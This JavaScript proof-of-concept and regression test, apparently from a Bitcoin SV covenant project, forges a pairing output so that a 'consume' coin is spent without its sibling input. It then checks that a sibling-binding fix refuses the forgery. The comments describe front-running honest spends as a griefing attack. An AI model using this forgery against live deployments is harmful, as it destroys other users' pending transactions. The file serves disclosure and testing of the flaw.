'use strict'

// A STAGE THAT DOES NOT KNOW ITS SIBLINGS CAN BE SPENT WITHOUT THEM.
//
// The two-way split binds its stages through `hashOutputs`: each input requires
// the committed data output to be the one IT builds, so both must have built
// the same bytes. That argument is sound about the BYTES and says nothing about
// which inputs are present. Nothing in `pairing.consume` checks that
// `pairing.publish` is also being spent.
//
// So consider a transaction with ONE input — the consume coin — and one data
// output carrying an f of the spender's choosing. The covenant is satisfied:
// the data IS what the transaction publishes. What remains is whether the
// spender can find an f with F(f) = e(P, Q) without running a Miller loop.
//
// They can, cheaply. F is exponentiation by d = 3(p¹²−1)/r, and the target
// t = e(P,Q) has order r. Since gcd(d, r) = 1, put k = d⁻¹ mod r and take
// f = t^k; then F(f) = t^(kd) = t. Two modular exponentiations, no pairing.
//
// The coin pays nothing to the forger — the covenant forbids change, so the
// satoshis all become fee — but that is not what is at stake. The claim the
// construction makes is that the TRANSACTION establishes the computation, and
// a reader who checks one input is deceived. Worse, it is a live griefing
// attack on a deployment: front-run the honest spend, consume its final-
// exponentiation coin with a forged f, and the honest spend can never be
// published, because its input is gone.
//
// This exits non-zero while the hole is open. That is the point of it.

const bsv = require('@smartledger/bsv')
const { Asm } = require('../src/asm')
const { policyFlags } = require('../src/run')
const bls = require('../src/bls12381')
const pairing = require('../src/modules/pairing')
const txmod = require('../src/modules/tx')
const { pushNum, pushData } = require('../src/num')
const H = require('@smartledger/bsv/lib/covenant/helpers')

const P = bls.P
const R = bls.R
const params = { n: P, nn: P }
const SATS = 1

// ── the forgery, in the model first ─────────────────────────────────────────
const d = 3n * (P ** 12n - 1n) / R
const egcd = (a, b) => (b ? (([g, x, y]) => [g, y, x - (a / b) * y])(egcd(b, a % b)) : [a, 1n, 0n])
const [g] = egcd(d % R, R)
if (g !== 1n) { console.log('\n  gcd(d, r) != 1 — the forgery does not apply\n'); process.exit(1) }
const k = ((egcd(d % R, R)[1] % R) + R) % R

const expected = bls.pairing(bls.G1, bls.G2)
const honestRaw = pairing.replay([{ P: bls.G1, Q: bls.G2 }], pairing.FULL, P).f
const honestF = bls.X < 0n ? bls.f12conj(honestRaw) : honestRaw
const forgedF = bls.f12pow(expected, k)

console.log('\n  the forgery, in the model\n')
console.log(`    F(f) = e(P,Q) for the honest f            ${bls.f12eq(bls.finalExponentiate(honestF), expected)}`)
console.log(`    F(f) = e(P,Q) for the forged f            ${bls.f12eq(bls.finalExponentiate(forgedF), expected)}`)
console.log(`    the forged f is a different element       ${!bls.f12eq(forgedF, honestF)}`)
console.log('    it cost two modexps and no Miller loop')

// ── the coin, and a transaction that spends it alone ────────────────────────
const bare = pairing.consume(expected, { cases: [{ name: 'the honest spend', spend: { f: honestF }, params }] })
const SIB = { count: 2, index: 1 }
const bound = pairing.consume(expected, {
  siblings: SIB,
  cases: [{ name: 'the honest spend', spend: { f: honestF, siblings: SIB }, params }]
})

function coin (m) {
  const asm = new Asm()
  asm.given(m.inputs.map((i) => ({ name: i.name, kind: i.kind || 'num', width: i.width })))
  m.emit(asm, params)
  asm.num(1, 'ok')
  return asm.script()
}

/**
 * Spend `m`'s coin publishing `f`, in a transaction with `inputs` inputs, with
 * the coin at `at`. The other inputs carry no scripts: only their outpoints
 * reach the preimage, which is the whole of what the sibling check reads.
 */
function spend (m, f, { inputs = 1, at = 0 } = {}) {
  const lock = coin(m)
  const data = pairing.serialiseF12(pairing.spread(f, 'f'), 'f')
  const tx = new bsv.Transaction()
  const prev = Buffer.alloc(32, 0xc3)
  for (let j = 0; j < inputs; j++) {
    tx.addInput(new bsv.Transaction.Input({
      prevTxId: prev, outputIndex: j, script: new bsv.Script(), sequenceNumber: 0xfffffffe
    }), j === at ? lock : new bsv.Script(), SATS)
  }
  tx.addOutput(txmod.dataOutput(pairing.STATE_BYTES, data))
  tx._outputAmount = undefined

  txmod.PushTx.grind(tx, at, lock, SATS, { field: 'sequence' })
  const preimage = Buffer.from(H.rawPreimage(tx, at, lock, SATS, txmod.SIGHASH_ALL_FORKID))
  const values = {
    preimage,
    data,
    fundingTxid: preimage.subarray(68, 100),
    ...pairing.finalExp.hint(pairing.spread(f, 'f'), params)
  }
  const unlock = new bsv.Script()
  for (const i of m.inputs) {
    const v = values[i.name]
    if (v === undefined) { console.log(`\n  missing witness ${i.name}\n`); process.exit(1) }
    unlock.add(i.kind === 'bytes' ? pushData(v) : pushNum(v))
  }
  const interp = new bsv.Script.Interpreter()
  let ok = false
  let err = null
  try { ok = interp.verify(unlock, lock, tx, at, policyFlags(), new bsv.crypto.BN(SATS)) } catch (e) { err = e.message }
  return { ok, err: err || interp.errstr, lock: lock.toBuffer().length }
}

const say = (r) => (r.ok ? 'ACCEPTED' : 'refused')

console.log('\n  pairing.consume as deployed — bound by hashOutputs alone\n')
const bareHonest = spend(bare, honestF)
const bareForged = spend(bare, forgedF)
console.log(`    one input, one data output, the honest f       ${say(bareHonest)}`)
console.log(`    one input, one data output, the FORGED f       ${say(bareForged)}`)
if (!bareForged.ok) {
  console.log('\n  the forged lone spend was refused, which this tool did not expect.')
  console.log('  Either the forgery is wrong or the coin already checks its siblings.\n')
  process.exit(1)
}
console.log('\n    A coin spent by a party that never evaluated a pairing. hashOutputs')
console.log('    binds the BYTES the inputs agree on; it does not establish that the')
console.log('    input which was supposed to produce them is in the transaction.')

console.log('\n  pairing.consume with { siblings: { count: 2, index: 1 } }\n')
const boundLone = spend(bound, forgedF)
const boundWrongSlot = spend(bound, forgedF, { inputs: 2, at: 0 })
const boundFamily = spend(bound, honestF, { inputs: 2, at: 1 })
console.log(`    one input, the FORGED f                        ${say(boundLone)}`)
console.log(`    two inputs but the coin at slot 0, FORGED f    ${say(boundWrongSlot)}`)
console.log(`    two inputs, the coin at slot 1, the honest f   ${say(boundFamily)}`)
console.log(`\n    the check costs ${bound.inputs.length - bare.inputs.length} extra witness (a 32-byte txid) and ${boundFamily.lock - bareHonest.lock} bytes of script,`)
console.log(`    against a ${bareHonest.lock.toLocaleString()}-byte locking script`)

const failed = []
if (boundLone.ok) failed.push('a lone spend still passes')
if (boundWrongSlot.ok) failed.push('the coin passes in a slot it does not claim')
if (!boundFamily.ok) failed.push(`the honest family spend was refused — ${boundFamily.err}`)
if (failed.length) {
  console.log('\n  FAILING:')
  for (const f of failed) console.log(`    ${f}`)
  console.log('')
  process.exit(1)
}
console.log('\n  The forged spend now needs the whole family in the transaction, and the')
console.log('  sibling at slot 0 is the Miller loop that has to have produced the f.')
console.log('  What remains outside the script: that those outpoints carry the scripts')
console.log('  they are supposed to. An outpoint does not name a script — that is one')
console.log('  check on one funding transaction, which is what verify-chain does.\n')
